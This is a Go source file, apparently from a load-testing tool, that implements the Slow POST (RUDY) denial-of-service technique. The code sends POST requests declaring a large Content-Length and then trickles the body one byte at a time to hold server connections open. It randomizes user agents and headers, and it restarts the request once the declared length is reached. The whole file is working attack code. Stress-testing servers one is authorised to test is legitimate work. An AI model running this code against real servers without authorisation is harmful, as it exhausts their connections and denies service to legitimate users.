package strategy

import (
	"context"
	"math/rand"
	"time"

	"github.com/srtdog64/loadtestforge/internal/config"
	"github.com/srtdog64/loadtestforge/internal/errors"
	"github.com/srtdog64/loadtestforge/internal/httpdata"
	"github.com/srtdog64/loadtestforge/internal/netutil"
)

// SlowPost implements the Slow POST (RUDY) attack.
// It sends POST request with large Content-Length but transmits body very slowly,
// one byte at a time, to occupy server connections.
type SlowPost struct {
	BaseStrategy
	contentLength int
}

// NewSlowPost creates a new SlowPost strategy.
func NewSlowPost(sendInterval time.Duration, contentLength int, bindIP string) *SlowPost {
	common := DefaultCommonConfig()
	common.KeepAliveInterval = sendInterval
	return &SlowPost{
		BaseStrategy:  NewBaseStrategy(bindIP, common),
		contentLength: contentLength,
	}
}

// NewSlowPostWithConfig creates a SlowPost strategy from StrategyConfig.
func NewSlowPostWithConfig(cfg *config.StrategyConfig, bindIP string) *SlowPost {
	return &SlowPost{
		BaseStrategy:  NewBaseStrategyFromConfig(cfg, bindIP),
		contentLength: cfg.ContentLength,
	}
}

func (s *SlowPost) Execute(ctx context.Context, target Target) error {
	connID := generateConnID()
	startTime := time.Now()

	mc, parsedURL, err := netutil.DialManaged(ctx, target.URL, s.GetConnConfig(), &s.activeConnections)
	if err != nil {
		return errors.ClassifyAndWrap(err, "connection failed")
	}
	defer mc.Close()

	// Record connection start
	s.RecordConnectionStart(connID, mc.RemoteAddr().String())

	userAgent := httpdata.RandomUserAgent()

	// Build POST request with large Content-Length
	postRequest := s.GetHeaderRandomizer().BuildPOSTRequest(
		parsedURL,
		userAgent,
		s.contentLength,
		"application/x-www-form-urlencoded",
	)

	if _, err := mc.WriteWithTimeout([]byte(postRequest), config.DefaultWriteTimeout); err != nil {
		s.RecordTimeout()
		return errors.ClassifyAndWrap(err, "write failed")
	}

	// Record initial success
	s.RecordLatency(time.Since(startTime))

	ticker := time.NewTicker(s.GetKeepAliveInterval())
	defer ticker.Stop()

	bytesSent := 0
	bodyChars := "abcdefghijklmnopqrstuvwxyz0123456789"

	for {
		select {
		case <-mc.Context().Done():
			s.RecordConnectionEnd(connID)
			return nil
		case <-ticker.C:
			if bytesSent >= s.contentLength {
				// Reset and start new request
				bytesSent = 0
				if _, err := mc.WriteWithTimeout([]byte(postRequest), config.DefaultWriteTimeout); err != nil {
					s.RecordTimeout()
					s.RecordConnectionEnd(connID)
					return errors.ClassifyAndWrap(err, "write failed")
				}
				continue
			}

			// Send single byte of body
			bodyByte := bodyChars[rand.Intn(len(bodyChars))]
			if _, err := mc.WriteWithTimeout([]byte{byte(bodyByte)}, config.DefaultWriteTimeout); err != nil {
				s.RecordTimeout()
				s.RecordConnectionEnd(connID)
				return errors.ClassifyAndWrap(err, "write failed")
			}
			bytesSent++

			// Record activity periodically (every 100 bytes)
			if bytesSent%100 == 0 {
				s.RecordConnectionActivity(connID)
			}
		}
	}
}

func (s *SlowPost) Name() string {
	return "slow-post"
}
